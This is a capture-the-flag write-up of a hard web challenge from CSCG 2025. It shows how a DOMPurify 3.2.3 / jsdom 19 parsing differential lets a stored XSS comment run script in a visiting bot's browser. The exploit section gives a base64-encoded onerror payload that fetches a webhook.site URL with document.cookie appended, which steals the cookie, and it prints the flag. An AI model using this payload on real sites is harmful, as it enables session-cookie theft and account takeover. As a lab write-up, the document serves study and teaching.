---
title: Air Smeller - CSCG 2025 - Write-Up
date: 2025-04-24 10:04:00 +0200
categories: [Cyber Security Challenge Germany]
tags: [web,js,xss,hard]
description: Find a XSS vulnerability.
image:
  path: /assets/blog/Air Smeller/logo.png
  alt: CSCG image
---

This is a Write-Up for the challenge "Air Smeller" of the CSCG 2025, the challenge is rated as hard and can be found in the Web category.

## Description

> I found this website were you can rate the smell of the air, after purification. Do you know a good purifier, maybe you can recommend some purifier to the people.

We are given a code of a web app written in NextJS, the application allows us to submit ratings with text. A bot is visiting the site every X minutes.

## Vulnerability

You get the source code of the site, with the line:

```jsx
"use server";

import { getRatings } from "@/utils/ratings";
import { JSDOM } from "jsdom";
import DOMPurify from "dompurify";
import { Stars } from "./stars";

export const Ratings = async () => {
  const window = new JSDOM("").window;
  const purify = DOMPurify(window);

  return (
    <div>
      <div className="font-bold">
        What other people said about the smell of our purifier:
      </div>
      {(await getRatings()).map((r, i) => (
        <div key={i} className="flex bg-white p-2 flex-col">
          <div className="rounded-lg border p-2 w-full bg-blue-200">
            <Stars value={r.stars} />
            <div
              dangerouslySetInnerHTML={ { __html: purify.sanitize(r.comment) } }
            />
          </div>
        ...
        </div>
      ))}
    </div>
  );
};
```

The content of the comment is rendered using the `purify` sanitizer and the `dangerouslySetInnerHTML`. The `DOMPurify` library parses HTML code and decides whether the tags are allowed or not, it filters for malicious payloads which cloud execute malicious code and filters them out. The idea of this challenge is to find a way to bypass this function and execute XSS because in this challenge there is a bot visiting the site every few minutes and if we can get the bot to execute our malicious JavaScript we can retrieve the flag from the bots cookie and write it to the page or send it to some listener.

If you look at the GitHub page of the project [`DOMpurify`](https://github.com/cure53/DOMPurify) and check the releases you won't easily find a node for a fix of the vulnerability. The thing to note is, that the payload not only depends on `DOMpurify` but also `jsdom`. `jsdom` is basically a HTML parser, you can give the application code and it will build objects out of it.

The next thing I did is looking for known vulnerabilities. We have to note, that jsdom is in our project as version 19.0 and DOMpurify in `3.2.3`.


I found [this](https://www.ias.cs.tu-bs.de/publications/parsing_differentials.pdf) article of the University of Braunschweig. The article describes XS vulnerabilities in detail and it matches the versions we are working with (DOMPurify (jsdom19)).

In section `5.2. Weaponizing Sanitizers`, you can read about the vulnerability of jsdom, which translates the payload `<svg><style>&lt;img src=x onerror=f()&gt;<keygen>` to `<svg><style><img src=x onerror=f()>`, which essentially weaponizes the payload.

You can try the payload and check if the server is vulnerable.


## Exploit

We can use this payload to build our own payload.

The easiest way to execute code for me is using `eval(atob(""))` which can be used to convert an base64 string and then execute it in JS, with that we do not have to worry about any encoding issues or problems, we can simply add this payload to the `onerror`, so `onerror=eval(atob("")`.

To exfiltrate the flag we can simply use a webhook. I got one from [https://webhook.site](https://webhook.site), you can copy your private URL and create the exfiltration payload with it:
```js
fetch("https://webhook.site/a44da78b-0275-41f1-afce-4417126867d4?test"+document.cookie)
```

With that you can base64 encode the payload and then use the final payload:
```
<svg><style>&lt;img src=x onerror=eval(atob("ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlL2E0NGRhNzhiLTAyNzUtNDFmMS1hZmNlLTQ0MTcxMjY4NjdkND90ZXN0Iitkb2N1bWVudC5jb29raWUp"))&gt;<keygen>
```

Then you can paste the payload and execute it after around 60 seconds you should get the flag returned.



Flag:
```
CSCG{0ld_A1r_Smeels_B4d}
```
